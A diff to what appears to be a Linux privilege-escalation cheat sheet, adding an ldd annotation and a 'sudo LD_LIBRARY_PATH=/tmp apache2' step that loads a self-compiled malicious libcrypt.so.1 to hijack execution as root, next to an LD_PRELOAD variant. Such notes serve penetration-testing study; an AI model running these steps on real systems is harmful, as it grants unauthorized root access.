@@ -106,7 +106,7 @@ sudo LD_PRELOAD=/tmp/preload.so program-name-here
 ```
 #### If env_keep+=LD_LIBRARY_PATH" existed. 🔆
 ```bash
-ldd /usr/sbin/apache2
+ldd /usr/sbin/apache2 #  libcrypt.so.1 => /lib/libcrypt.so.1 
 nano /tmp/library_path.c ⬇️⬇️⬇️⬇️
 ---------------------
 #include <stdio.h>
@@ -121,6 +121,7 @@ void hijack() {
 }
 ---------------------
 gcc  /tmp/library_path.c -fPIC -shared -o /tmp/libcrypt.so.1 
+sudo LD_LIBRARY_PATH=/tmp apache2
 ```
 ## Weak File Permissions ✅
 ```bash
